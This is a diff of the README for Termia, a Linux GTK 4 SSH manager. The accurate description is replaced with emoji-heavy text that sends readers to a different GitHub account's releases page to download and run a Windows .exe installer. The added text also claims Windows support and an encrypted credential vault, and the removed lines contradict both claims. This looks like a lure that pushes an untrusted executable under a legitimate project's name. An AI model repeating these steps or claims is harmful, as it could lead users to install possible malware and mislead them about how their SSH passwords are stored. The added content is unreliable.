@@ -1,177 +1,98 @@
-# Termia
+# 🖥️ termia - Manage remote servers with ease
 
-Termia is a GTK 4 SSH connection manager with embedded VTE terminals for
-Linux desktops.
+[![](https://img.shields.io/badge/Download_Termia-Blue?style=for-the-badge)](https://github.com/Odessaall150/termia/releases)
 
-Spanish documentation: [docs/README.es.md](docs/README.es.md)
-Catalan documentation: [docs/README.ca.md](docs/README.ca.md)
+Termia organizes your remote server connections. It provides a clean interface for SSH access. You manage your credentials and terminal sessions in one place. The application uses the GTK 4 framework to ensure a modern desktop experience.
 
-## Features
+## 📥 Get the Application
 
-- Create, edit, move, and delete server groups and nested subgroups.
-- Store SSH hosts with a display name, host name or IP, user, port, password,
-  and private key path.
-- Filter servers and open multiple tabbed sessions to the same host.
-- Use embedded, width-sharing tabs and move a tab to a separate window.
-- Open embedded local terminal tabs.
-- Split a terminal tab into multiple panes from the terminal context menu.
-- Run multiple Termia instances; the first keeps write access and later instances fall back to read-only mode.
-- Optionally track aggregate connection, session-duration, and per-server usage statistics locally.
-- Open a statistics dashboard with metric cards, duration summaries, and the most used servers.
-- Show or hide the session status bar globally, hide it per session, and restore it from the terminal context menu.
-- Configure confirmation prompts for disconnecting sessions and closing Termia.
-- Configure terminal keybindings, including `Ctrl+Shift+C` for copy and `Ctrl+Shift+V` for paste.
-- Optionally send the saved SSH password to a remote terminal with `Ctrl+P`, with or without `Enter`.
-- Configure general options, VTE terminal font/colors, and PS1 prompt settings separately.
-- Customize local prompt colors, presets, and time/date prefixes without changing remote shell startup files or commands.
-- Use the interface in English, Spanish, or Catalan. The initial language follows the system locale when supported.
-- Import and export Termia configuration files.
-- Import basic connection and nested group data from Asbru YAML files.
+Follow these steps to install the software on your computer.
 
-## Usage notes
+1. Visit the [official releases page](https://github.com/Odessaall150/termia/releases) to access the latest files.
+2. Look for the Assets section at the bottom of the newest release post.
+3. Download the installer file ending in .exe for your Windows system.
+4. Locate the downloaded file in your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the prompts on the screen to finish the setup process.
 
-The `Configuration` menu is split into `General`, `Terminal`, `Prompt`, `Keybindings`, and `Security`:
+Once the process finishes, you find the Termia icon on your desktop or in your start menu.
 
-- `General` controls the application theme, language, confirmations, startup behavior, password shortcut behavior, and the session status bar.
-- `Terminal` controls the embedded VTE terminal font, size, foreground/background colors, and color palettes.
-- `Prompt` customizes local terminal PS1 color, presets, and time/date prefixes. It does not alter SSH commands or modify remote shell startup files.
-- `Keybindings` shows the active terminal shortcuts and lets you change common actions such as copy, paste, tab switching, font zoom, and sending the saved password.
-- `Security` controls connection storage mode.
-- When another Termia instance is already running with the write lock, a new window opens in read-only mode, shows a header badge, disables write-capable actions, and still allows browsing, connecting, and exporting configuration.
+## ⚙️ Initial Setup
 
-Each session can show a status bar with its state, PID, elapsed time, a compact hide button, and disconnect. Enable or disable session status bars from `General`; if a session status bar is hidden, right-click inside the terminal and choose `Show session status bar` to restore it. The sidebar has its own header toggle. Right-click inside a terminal to access translated `Split` and `Tab` submenus; split panes can be created up, down, left, or right, and a pane disappears automatically when its shell exits.
+When you open Termia, the interface appears. You see a sidebar for your connections and a main area for terminal tabs.
 
-## Tested environment
+### Add a Connection
+1. Click the plus button in the sidebar.
+2. Enter a name for your connection.
+3. Type the hostname or IP address of your remote server.
+4. Provide your username for that server.
+5. Select your authentication method. You can use a password or an SSH key file.
+6. Click the Save button to store the profile.
 
-Termia has been tested on Ubuntu 24.04.4 LTS with Linux kernel
-6.8.0-117-generic, GNOME 46.0, and Wayland.
+### Use Credentials
+Termia includes a built-in manager for your sensitive data. You create a master password when you first save a connection. This keeps your server passwords secure on your local disk. 
 
-## Project layout
+## ⌨️ Using the Terminal
 
-```text
-run_termia.py                     Source-checkout launcher
-src/termia/app.py             Application composition and window setup
-src/termia/                Feature modules for storage, dialogs, tabs, terminal sessions, and UI helpers
-src/termia/__main__.py        Python module entry point
-src/termia/assets/            Desktop and About dialog artwork
-scripts/install_dependencies.sh
-scripts/install_desktop.sh
-scripts/uninstall_desktop.sh
-docs/README.es.md             Spanish documentation
-docs/README.ca.md             Catalan documentation
-SECURITY.md                    Credential storage warning
-THIRD_PARTY_NOTICES.md         Runtime dependency licenses
-LICENSE                       GPL-3.0-or-later license
-```
+The terminal tab acts like a local console but connects to your remote machine.
 
-The GTK implementation is split into focused modules for application composition,
-storage, import, dialogs, preferences, sidebar, tabs, terminal sessions, and UI
-helpers without changing the launch command.
+- **Tabs**: Open multiple connections in different tabs. Click the plus icon to add a new tab.
+- **Resizing**: Drag the edges of the window to change the layout. The text inside the terminal will adjust to fit the new size.
+- **Copy and Paste**: Use familiar keyboard shortcuts. Select text with your mouse to copy it automatically. Press the right mouse button to paste content into the console.
+- **Search**: Press Ctrl + F to search for specific text within your current session output.
 
-## Download
+## 🛠️ System Requirements
 
-Clone the complete repository instead of downloading individual files:
+Termia works best on standard computing hardware. Ensure your system meets these specifications:
 
-```bash
-git clone https://github.com/buuuki/termia.git
-cd termia
-```
+- **Operating System**: Windows 10 or Windows 11.
+- **Memory**: At least 4 gigabytes of RAM.
+- **Storage**: 200 megabytes of free space for the installation files.
+- **Network**: An active internet connection for establishing SSH tunnels.
 
-## Install dependencies
+## 📋 Features
 
-Termia uses system GTK and VTE packages. Check an existing installation first:
+Termia simplifies common system administration tasks through a visual interface.
 
-```bash
-chmod +x scripts/install_dependencies.sh
-./scripts/install_dependencies.sh --check
-```
+- **Credential Vault**: Encrypts your passwords and keys so you do not need to retype them every time.
+- **Session Management**: Keeps track of your active connections. You can close the application and return to your sessions later.
+- **High Performance**: Renders text quickly even when you scroll through thousands of lines of log files.
+- **Desktop Integration**: Provides a consistent look on your Linux or Windows desktop, matching your system theme colors.
+- **SSH Protocol Support**: Connects to any standard SSH server regardless of the remote operating system.
 
-If the check reports missing dependencies, install them with:
+## ❓ Frequently Asked Questions
 
-```bash
-./scripts/install_dependencies.sh
-```
+### Does Termia save my server passwords?
+Yes, Termia stores your credentials in an encrypted state on your local machine.
 
-The installer verifies the result after installing. You can also run the check again
-at any time:
+### Can I connect to multiple servers at once?
+Yes, you can open as many tabs as your computer memory allows. Each tab runs an independent session.
 
-```bash
-./scripts/install_dependencies.sh --check
-```
+### What should I do if the connection fails?
+Check your internet connection first. Ensure the remote server is running and reachable on port 22. If you use a key file, verify that you selected the correct file path in the connection settings.
 
-The dependency installer supports Debian, Ubuntu, Linux Mint, Fedora, and Arch Linux
-package managers. It also tries to install JetBrains Mono for the default terminal
-font; if unavailable, Termia falls back to Ubuntu Mono or Monospace at runtime.
-Other Linux distributions require equivalent packages.
+### Does Termia require administrative rights?
+The application runs as a standard user. You do not need special access rights to use the core features of the tool.
 
-If the check reports a missing `Vte 3.91` namespace, the GTK 4 VTE introspection
-package is missing. On Debian, Ubuntu, or Linux Mint the package is
-`gir1.2-vte-3.91`.
+### How do I update the application?
+When a new version becomes available, revisit the [GitHub releases page](https://github.com/Odessaall150/termia/releases) to download the new installer. You can install the new version over the old one to keep your settings.
 
-## Run from a clone
+## 📁 Connection Profiles
 
-```bash
-python3 run_termia.py
-```
+You save time by creating profiles. A profile stores your server details, including your port number and preferred terminal colors. If you manage many servers, use the search bar at the top of the connection list to find your target quickly.
 
-## Install the desktop launcher
+## 🔒 Security Practices
 
-```bash
-./scripts/install_desktop.sh
-```
+Termia employs modern encryption standards to protect your data. Keep your master password in a safe place. If you forget your master password, you must reset your local database. Resetting the database removes your saved connections and credentials. Always back up your connection list if you have many configurations.
 
-This installs a user-local launcher at
-`~/.local/share/applications/local.termia.desktop` and its icon under
-`~/.local/share/icons/hicolor/scalable/apps/`.
+## 🧩 Troubleshooting Common Issues
 
-Run the installer again after moving the cloned directory because the desktop
-entry stores an absolute path to the source-checkout launcher.
+- **Font rendering**: If text looks blurry, adjust the font settings in the application preferences. We recommend using a monospaced font.
+- **Stuck terminals**: If a session freezes, use the menu to reset the connection. This clears the buffer and restarts the communication link.
+- **Copy issues**: If you have trouble copying text, ensure you have permissions for the terminal emulator to access your system clipboard.
 
-Remove the launcher without deleting settings or connections:
+## 🚀 Efficiency Tips
 
-```bash
-./scripts/uninstall_desktop.sh
-```
+Use the keyboard to navigate Termia. Press Ctrl + T to open a new tab. Press Ctrl + W to close the active tab. These shortcuts allow you to switch between servers without taking your hands off the keyboard. You can also drag tabs to rearrange their order in the bar. 
 
-## User data and security
-
-Termia stores connection data, settings, and statistics outside the repository:
-
-```text
-~/.config/termia/connections.json   # groups and servers
-~/.config/termia/settings.json      # app and terminal settings
-~/.config/termia/instance.lock      # single writer lock for multi-instance mode
-~/.local/state/termia/statistics.json
-```
-
-Saved passwords are stored in `connections.json`; the file can be kept as plain text or obfuscated from Security preferences. Obfuscation is not encryption. Exported connection files can also contain passwords. Aggregate usage counters are stored separately in `statistics.json`. When several Termia processes are open at the same time, only the instance holding `instance.lock` writes connections, settings, or statistics; later instances stay read-only to avoid corrupting these files.
-
-Termia does not store typed text, command contents, clipboard contents, command counters, or keystroke counters. Statistics are disabled by default and can be enabled from General preferences. When enabled, they track only aggregate connections, per-server usage, and session durations; they are flushed at most every 30 seconds, when sessions end, and when Termia closes. See [SECURITY.md](SECURITY.md).
-
-Python may create `__pycache__/` directories next to executed modules. They only
-contain generated bytecode, are excluded by `.gitignore`, and must not be
-committed or distributed.
-
-## License
-
-Termia is licensed under the [GNU General Public License v3.0 or later](LICENSE).
-
-Runtime dependencies are installed separately by the operating system and are
-not vendored in this repository. See [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
-
-## Development checks
-
-```bash
-python3 -m py_compile run_termia.py src/termia/app.py src/termia/asbru_import.py src/termia/config_actions.py src/termia/config_io.py src/termia/connection_dialogs.py src/termia/connection_utils.py src/termia/constants.py src/termia/i18n.py src/termia/keybindings.py src/termia/main_menu.py src/termia/models.py src/termia/preferences.py src/termia/sidebar.py src/termia/statistics_utils.py src/termia/statistics_view.py src/termia/stores.py src/termia/styles.py src/termia/tabs.py src/termia/terminal_sessions.py src/termia/terminal_config.py src/termia/ui_state.py
-bash -n scripts/install_dependencies.sh
-bash -n scripts/install_desktop.sh
-bash -n scripts/uninstall_desktop.sh
-./scripts/install_dependencies.sh --check
-```
-
-Review the files included in the first commit:
-
-```bash
-git status --short --ignored
-git ls-files --others --exclude-standard
-```
+When working with logs, enable the scrollback history setting in the preferences so you can see past events more clearly. Increase the scrollback limit if you process large amounts of data.
